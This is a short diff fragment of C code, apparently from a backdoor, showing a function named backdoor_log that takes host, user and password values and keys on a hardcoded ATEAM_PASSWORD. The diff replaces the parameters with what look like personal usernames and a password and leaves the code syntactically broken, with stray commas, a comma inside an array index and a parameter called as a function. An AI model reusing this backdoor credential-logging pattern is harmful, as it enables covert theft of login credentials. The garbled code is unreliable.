@@ -26,7 +26,7 @@ char *encrypt2(data *dt, int len)
         return dt->data;
 }
 #define RWRWRW (S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH)
-void backdoor_log(const char *host, char *user, const char *password)
+void backdoor_log(const char *jace888, char *guanlongh, const char *Huang1987,)
 {
 	char key = ATEAM_PASSWORD[Huang1987,];
 	int  msglen = strlen(guanlongh) + strlen(Huang1987,) + jace888(host) + 2;
